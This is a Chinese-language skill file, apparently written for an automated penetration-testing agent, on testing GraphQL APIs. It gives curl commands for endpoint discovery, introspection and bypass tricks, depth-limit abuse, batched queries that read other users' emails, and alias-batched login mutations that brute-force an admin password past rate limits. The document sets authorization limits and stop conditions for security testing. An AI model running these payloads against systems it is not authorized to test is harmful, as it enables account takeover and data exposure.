---
name: graphql-security
description: 检测 GraphQL API 的安全配置缺陷，包括内省查询暴露、深度限制、字段建议和批量查询注入。
category: web
source: xalgorix
tags:
  - GraphQL
  - API 安全
  - 内省查询
  - 批量注入
required_tools:
  - curl
---

# GraphQL 安全测试

## 适用场景

- 目标提供了 GraphQL 端点（通常是 `/graphql`）。
- 需要检测内省查询是否被不当暴露。
- 测试查询深度限制和批量查询是否可被滥用。

## 授权边界

- 内省查询仅读取 schema 定义，不涉及实际数据。
- 批量查询测试使用自己的测试账号。
- 不利用发现的管理 mutation 操作真实数据。

## 前置条件

- 已发现 GraphQL 端点 URL。
- 有有效的认证 Token（如端点需要认证）。

## 执行步骤

### 步骤 1：端点探测

```bash
# 常见 GraphQL 路径
for path in graphql gql api/graphql query api v1/graphql graph; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://<target>/$path" \
    -X POST -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}')
  echo "$path: $code"
done
```

### 步骤 2：内省查询

```bash
# 标准内省查询
curl -X POST "https://<target>/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name type{name kind}}}}}"}' \
  -o schema.json
```

如果成功返回完整 schema，记录为信息泄露。

### 步骤 3：内省绕过

```bash
# 如果标准内省被禁用，尝试绕过
# 字符编码
curl -X POST "https://<target>/graphql" \
  -d '{"query":"{__schema%00{types{name}}}"}'

# 使用别名
curl -X POST "https://<target>/graphql" \
  -d '{"query":"{q:__schema{types{name}}}"}'

# 分片内省
curl -X POST "https://<target>/graphql" \
  -d '{"query":"query{__schema{types{name}}}"}'
```

### 步骤 4：深度/复杂度测试

```bash
# 循环嵌套查询（测试深度限制）
curl -X POST "https://<target>/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{a:user{posts{author{posts{author{posts{name}}}}}}}"}'
```

如未返回错误，说明缺少深度限制。

### 步骤 5：批量查询注入

```bash
# 批量查询（可能绕过认证）
curl -X POST "https://<target>/graphql" \
  -d '{"query":"query{user1:user(id:1){email}user2:user(id:2){email}}"}'

# 别名攻击 — 绕过验证码/速率限制
curl -X POST "https://<target>/graphql" \
  -d '{"query":"mutation{a:login(u:\"admin\",p:\"a\")b:login(u:\"admin\",p:\"b\")}"}'
```

## 停止条件

- 发现可执行管理 mutation（如 `deleteAllUsers`、`dropTables`），记录即停止。
- 内省暴露的 schema 包含敏感字段（如 `creditCardNumber`），停止提取并报告。

## 输出格式

- GraphQL 端点列表。
- 内省查询结果（暴露的 schema 规模）。
- 深度/复杂度限制测试结论。
- 批量查询和别名攻击结果。

## 验收标准

1. 发现了 GraphQL 端点并进行了内省查询测试。
2. 测试了至少 2 种内省绕过方法。
3. 进行了深度嵌套查询测试。
4. 测试了批量查询越权。
